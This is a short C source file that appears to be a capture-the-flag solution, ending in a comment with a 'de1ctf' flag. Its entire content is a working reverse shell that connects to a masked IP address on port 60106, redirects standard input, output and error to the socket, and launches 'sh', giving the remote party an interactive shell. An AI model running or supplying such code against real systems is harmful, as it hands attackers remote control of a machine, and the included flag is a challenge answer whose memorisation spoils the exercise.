#include <sys/socket.h> 
#include <netinet/in.h> 
#include <arpa/inet.h>
#include <errno.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>

extern int errno;

int main()
{
    int soc, remote;              
    struct sockaddr_in serv_addr; 

    serv_addr.sin_addr.s_addr = inet_addr("**.**.**.**"); 
    serv_addr.sin_port = htons(60106);                   
    serv_addr.sin_family = AF_INET;                     

    soc = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
    remote = connect(soc, (struct sockaddr *)&serv_addr, sizeof(struct sockaddr_in));

    if (remote == -1)
    {
        puts(strerror(errno));
    }

    dup2(soc, 0); 
    dup2(soc, 1); 
    dup2(soc, 2); 
    
    system("sh");

    return 0;
}
// de1ctf{Br3@king_th3_J4il}